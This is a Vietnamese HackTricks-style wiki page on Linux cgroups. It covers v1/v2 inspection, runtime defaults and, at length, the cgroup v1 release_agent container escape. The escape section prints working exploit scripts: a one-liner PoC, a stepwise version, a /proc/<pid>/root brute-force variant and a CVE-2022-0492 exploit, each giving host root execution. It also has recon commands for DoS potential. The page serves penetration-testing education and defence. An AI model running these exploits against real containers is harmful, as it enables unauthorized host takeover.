# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Tổng quan

**Control groups** của Linux là cơ chế trong kernel dùng để nhóm các tiến trình nhằm ghi nhận mức sử dụng, giới hạn, ưu tiên và thực thi chính sách. Nếu namespaces chủ yếu cô lập cách nhìn về tài nguyên, thì cgroups chủ yếu quản lý **mức độ** tài nguyên mà một nhóm tiến trình được phép sử dụng và trong một số trường hợp, **những loại tài nguyên nào** chúng có thể tương tác. Container liên tục dựa vào cgroups, ngay cả khi người dùng không trực tiếp thấy chúng, vì gần như mọi runtime hiện đại đều cần một cách để báo cho kernel biết: "các tiến trình này thuộc về workload này, và đây là các quy tắc tài nguyên áp dụng cho chúng".

Đó là lý do các container engine đưa container mới vào một cây con cgroup riêng. Khi cây tiến trình đã nằm ở đó, runtime có thể giới hạn bộ nhớ, giới hạn số lượng PID, đặt trọng số sử dụng CPU, điều tiết I/O và hạn chế quyền truy cập thiết bị. Trong môi trường production, điều này thiết yếu cho cả tính an toàn của môi trường multi-tenant lẫn việc vận hành ổn định. Container không có các giới hạn tài nguyên phù hợp có thể làm cạn kiệt bộ nhớ, tạo ra quá nhiều tiến trình hoặc chiếm dụng CPU và I/O, khiến host hoặc các workload lân cận mất ổn định.

Từ góc độ bảo mật, cgroups quan trọng theo hai cách riêng biệt. Thứ nhất, các giới hạn tài nguyên không phù hợp hoặc bị thiếu tạo điều kiện cho các cuộc tấn công denial-of-service đơn giản. Thứ hai, một số tính năng cgroup, đặc biệt trong các thiết lập **cgroup v1** cũ, từng tạo ra các primitive breakout mạnh khi có thể ghi vào chúng từ bên trong container.

## v1 so với v2

Hiện có hai mô hình cgroup chính. **cgroup v1** cung cấp nhiều hệ phân cấp controller, và các bài viết về exploit cũ thường xoay quanh những ngữ nghĩa khác thường, đôi khi quá mạnh, có ở đó. **cgroup v2** đưa ra hệ phân cấp thống nhất hơn và nhìn chung hoạt động rõ ràng hơn. Các bản phân phối hiện đại ngày càng ưu tiên cgroup v2, nhưng môi trường hỗn hợp hoặc cũ vẫn tồn tại, nên cả hai mô hình vẫn cần được xem xét khi đánh giá hệ thống thực tế.

Sự khác biệt này rất quan trọng vì một số câu chuyện container breakout nổi tiếng nhất, chẳng hạn như lạm dụng **`release_agent`** trong cgroup v1, gắn liền với hành vi cgroup cũ. Người đọc thấy một cgroup exploit trên blog rồi áp dụng máy móc vào hệ thống hiện đại chỉ dùng cgroup v2 có thể sẽ hiểu sai những gì thực sự khả thi trên mục tiêu.

## Kiểm tra

Cách nhanh nhất để xem shell hiện tại của bạn nằm ở đâu là:

```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```

Tệp `/proc/self/cgroup` hiển thị các đường dẫn cgroup gắn với tiến trình hiện tại. Trên máy chủ cgroup v2 hiện đại, bạn thường sẽ thấy một mục thống nhất. Trên máy chủ cũ hơn hoặc máy chủ chạy chế độ kết hợp, bạn có thể thấy nhiều đường dẫn bộ điều khiển v1. Khi đã biết đường dẫn, bạn có thể kiểm tra các tệp tương ứng trong `/sys/fs/cgroup` để xem giới hạn và mức sử dụng hiện tại.

Trên máy chủ cgroup v2, các lệnh sau rất hữu ích:

```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```

Các tệp này cho biết những controller nào tồn tại và controller nào được ủy quyền cho các cgroup con. Mô hình ủy quyền này rất quan trọng trong môi trường rootless và do systemd quản lý, nơi runtime có thể chỉ kiểm soát được một phần chức năng cgroup mà phân cấp cha thực sự ủy quyền.

## Bài thực hành

Một cách để quan sát cgroups trong thực tế là chạy một container bị giới hạn bộ nhớ:

```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```

Bạn cũng có thể thử một container bị giới hạn PID:

```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```

Các ví dụ này hữu ích vì giúp liên hệ flag của runtime với giao diện tệp của kernel. Runtime không thực thi quy tắc bằng phép màu; nó ghi các thiết lập cgroup liên quan rồi để kernel thực thi chúng đối với cây tiến trình.

## Cách sử dụng Runtime

Docker, Podman, containerd và CRI-O đều dựa vào cgroups trong hoạt động bình thường. Những điểm khác biệt thường không nằm ở việc chúng có dùng cgroups hay không, mà ở **các giá trị mặc định chúng chọn**, **cách chúng tương tác với systemd**, **cách hoạt động của việc ủy quyền rootless** và **mức độ cấu hình được kiểm soát ở cấp engine so với cấp điều phối**.

Trong Kubernetes, các yêu cầu và giới hạn tài nguyên cuối cùng trở thành cấu hình cgroup trên node. Đường đi từ Pod YAML đến việc thực thi ở kernel đi qua kubelet, CRI runtime và OCI runtime, nhưng cgroups vẫn là cơ chế kernel cuối cùng áp dụng quy tắc. Trong các môi trường Incus/LXC, cgroups cũng được sử dụng rộng rãi, đặc biệt vì system container thường có cây tiến trình phong phú hơn và kỳ vọng vận hành giống VM hơn.

## Cấu hình sai và thoát khỏi Container

Câu chuyện bảo mật cgroup kinh điển xoay quanh cơ chế **`release_agent` có thể ghi của cgroup v1**. Trong mô hình đó, nếu attacker có thể ghi vào đúng các tệp cgroup, bật `notify_on_release` và kiểm soát đường dẫn được lưu trong `release_agent`, kernel có thể thực thi một đường dẫn do attacker chọn trong các namespace ban đầu trên host khi cgroup trở nên trống. Đó là lý do các bài viết cũ tập trung nhiều vào khả năng ghi của controller cgroup, các tùy chọn mount và điều kiện namespace/capability.

Ngay cả khi không có `release_agent`, sai sót về cgroup vẫn đáng lưu tâm. Quyền truy cập thiết bị quá rộng có thể khiến container truy cập được các thiết bị của host. Thiếu giới hạn bộ nhớ và PID có thể biến một lần thực thi mã đơn giản thành DoS trên host. Việc ủy quyền cgroup yếu trong các tình huống rootless cũng có thể khiến defender lầm tưởng rằng đã có hạn chế, trong khi runtime thực tế chưa từng có khả năng áp dụng nó.

### Bối cảnh về `release_agent`

Kỹ thuật `release_agent` chỉ áp dụng cho **cgroup v1**. Ý tưởng cơ bản là khi tiến trình cuối cùng trong cgroup thoát và `notify_on_release=1` được thiết lập, kernel sẽ thực thi chương trình có đường dẫn được lưu trong `release_agent`. Việc thực thi đó diễn ra trong **các namespace ban đầu trên host**, khiến `release_agent` có thể ghi trở thành một primitive thoát khỏi container.

Để kỹ thuật này hoạt động, attacker thường cần:

- một hệ phân cấp **cgroup v1** có thể ghi
- khả năng tạo hoặc sử dụng cgroup con
- khả năng thiết lập `notify_on_release`
- khả năng ghi một đường dẫn vào `release_agent`
- một đường dẫn trỏ đến tệp thực thi khi xét từ góc nhìn của host

### PoC kinh điển

PoC một dòng mang tính lịch sử là:<sup>[[1]](#references)</sup>

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```

PoC này ghi đường dẫn payload vào `release_agent`, kích hoạt cgroup release, rồi đọc lại tệp đầu ra được tạo trên host.

### Diễn giải dễ hiểu

Cùng ý tưởng đó sẽ dễ hiểu hơn khi được chia thành các bước.<sup>[[1]](#references)</sup>

1. Tạo và chuẩn bị một cgroup có thể ghi:

```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. Xác định đường dẫn trên host tương ứng với hệ thống tệp của container:

```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. Đặt một payload có thể nhìn thấy từ đường dẫn trên host:

```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```

4. Kích hoạt thực thi bằng cách làm cho cgroup trống:

```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```

Tác động là payload được thực thi phía host với quyền root của host. Trong một exploit thực tế, payload thường tạo một file chứng minh, mở reverse shell hoặc sửa đổi trạng thái của host.

### Biến thể đường dẫn tương đối sử dụng `/proc/<pid>/root`

Trong một số môi trường, đường dẫn trên host tới filesystem của container không rõ ràng hoặc bị storage driver ẩn đi. Khi đó, có thể biểu diễn đường dẫn tới payload thông qua `/proc/<pid>/root/...`, trong đó `<pid>` là PID trên host của một process thuộc container hiện tại. Đây là cơ sở của biến thể brute-force đường dẫn tương đối:<sup>[[2]](#references)</sup>

```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID}"
      exit 1
    fi
  fi
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```

Thủ thuật quan trọng ở đây không phải bản thân việc brute force mà là dạng đường dẫn: `/proc/<pid>/root/...` cho phép kernel phân giải một tệp bên trong filesystem của container từ host namespace, ngay cả khi chưa biết trước đường dẫn lưu trữ trực tiếp trên host.

### Biến thể CVE-2022-0492

Năm 2022, CVE-2022-0492 cho thấy thao tác ghi vào `release_agent` trong cgroup v1 không kiểm tra chính xác `CAP_SYS_ADMIN` trong user namespace **initial**. Điều này giúp kỹ thuật dễ thực hiện hơn nhiều trên các kernel có lỗ hổng, vì một tiến trình trong container có thể mount một phân cấp cgroup rồi ghi vào `release_agent` mà không cần có đặc quyền trong user namespace của host.<sup>[[3]](#references)</sup>

Exploit tối giản:

```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
  mkdir /tmp/c
  mount -t cgroup -o memory none /tmp/c
  echo 1 > /tmp/c/notify_on_release
  echo /proc/self/exe > /tmp/c/release_agent
  (sleep 1; echo 0 > /tmp/c/cgroup.procs) &
  while true; do sleep 1; done
'
```

Trên một kernel có lỗ hổng, host thực thi `/proc/self/exe` với quyền root của host.

Để khai thác thực tế, trước tiên hãy kiểm tra xem môi trường còn để lộ các đường dẫn cgroup-v1 có thể ghi hoặc quyền truy cập thiết bị nguy hiểm hay không:

```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```

Nếu `release_agent` tồn tại và có thể ghi, thì bạn đã ở trong vùng legacy-breakout:

```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```

Nếu bản thân đường dẫn cgroup không dẫn đến escape, cách sử dụng thực tế tiếp theo thường là denial of service hoặc reconnaissance:

```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```

Các lệnh này nhanh chóng cho bạn biết workload có thể fork-bomb, tiêu thụ bộ nhớ mạnh tay hoặc lạm dụng giao diện cgroup legacy có quyền ghi hay không.

## Kiểm tra

Khi đánh giá một mục tiêu, mục đích của các kiểm tra cgroup là tìm hiểu mô hình cgroup nào đang được sử dụng, container có thấy các đường dẫn controller có quyền ghi hay không, và liệu các primitive breakout cũ như `release_agent` có còn liên quan hay không.

```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```

Điều gì đáng chú ý ở đây:

- Nếu `mount | grep cgroup` hiển thị **cgroup v1**, các bài viết cũ về thoát khỏi container sẽ phù hợp hơn.
- Nếu `release_agent` tồn tại và có thể truy cập, đây là dấu hiệu đáng để điều tra sâu hơn ngay lập tức.
- Nếu hệ thống phân cấp cgroup hiển thị có thể ghi và container cũng có capabilities mạnh, môi trường này cần được xem xét kỹ hơn nhiều.

Nếu phát hiện **cgroup v1**, các mount controller có thể ghi và container cũng có capabilities mạnh hoặc được bảo vệ yếu bằng seccomp/AppArmor, thì tổ hợp này cần được chú ý cẩn thận. cgroups thường bị xem là chủ đề quản lý tài nguyên nhàm chán, nhưng trong lịch sử, chúng đã góp mặt trong một số chuỗi thoát khỏi container mang tính giáo dục nhất, chính vì ranh giới giữa “kiểm soát tài nguyên” và “ảnh hưởng đến host” không phải lúc nào cũng rõ ràng như mọi người vẫn nghĩ.

## Runtime Defaults

| Runtime / platform | Trạng thái mặc định | Hành vi mặc định | Các cách làm suy yếu thường gặp |
| --- | --- | --- | --- |
| Docker Engine | Được bật theo mặc định | Container tự động được đưa vào cgroups; giới hạn tài nguyên là tùy chọn, trừ khi được thiết lập bằng flags | bỏ qua `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Được bật theo mặc định | `--cgroups=enabled` là mặc định; giá trị mặc định của cgroup namespace thay đổi tùy phiên bản cgroup (`private` trên cgroup v2, `host` trên một số cấu hình cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, nới lỏng quyền truy cập thiết bị, `--privileged` |
| Kubernetes | Được bật theo mặc định thông qua runtime | Pod và container được runtime của node đưa vào cgroups; khả năng kiểm soát tài nguyên chi tiết phụ thuộc vào `resources.requests` / `resources.limits` | bỏ qua requests/limits tài nguyên, quyền truy cập thiết bị ở mức privileged, cấu hình sai runtime ở cấp host |
| containerd / CRI-O | Được bật theo mặc định | cgroups là một phần trong quy trình quản lý vòng đời thông thường | cấu hình runtime trực tiếp làm nới lỏng quyền kiểm soát thiết bị hoặc để lộ các giao diện cgroup v1 cũ có thể ghi |

Điểm khác biệt quan trọng là **sự tồn tại của cgroup** thường là mặc định, còn **các giới hạn tài nguyên hữu ích** thường là tùy chọn, trừ khi được cấu hình rõ ràng.

## References

- [1] [Tìm hiểu về các cách thoát khỏi Docker container](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Thoát khỏi container privileged - Control Groups release_agent](https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html)
- [3] [Lỗ hổng Linux mới CVE-2022-0492 ảnh hưởng đến Cgroups: Container có thể thoát ra ngoài không?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
{{#include ../../../../banners/hacktricks-training.md}}
